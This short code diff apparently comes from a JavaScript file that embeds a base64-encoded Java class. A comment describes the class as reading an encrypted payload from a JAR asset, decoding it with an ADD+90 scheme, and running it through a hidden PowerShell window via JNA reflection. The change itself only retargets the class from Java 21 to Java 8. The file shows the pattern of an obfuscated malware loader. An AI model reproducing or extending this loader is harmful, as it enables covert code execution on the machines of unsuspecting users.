@@ -1,5 +1,5 @@
 // Main.class: reads /assets/data.pak from JAR, decrypts with ADD+90, runs with PowerShell hidden via JNA reflection
-// Compiled from Main.java with javac 21 (class file version 65/Java 21)
+// Compiled from Main.java with javac 21 using -source 8 -target 8 (class file version 52/Java 8)
 const MAIN_CLASS_B64 =
   "yv66vgAAADQA6goAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClW" +
   "BwAIAQAQamF2YS9sYW5nL1N0cmluZwgACgEABVVURi04CgAHAAwMAAUADQEAFyhbQkxqYXZhL2xh" +
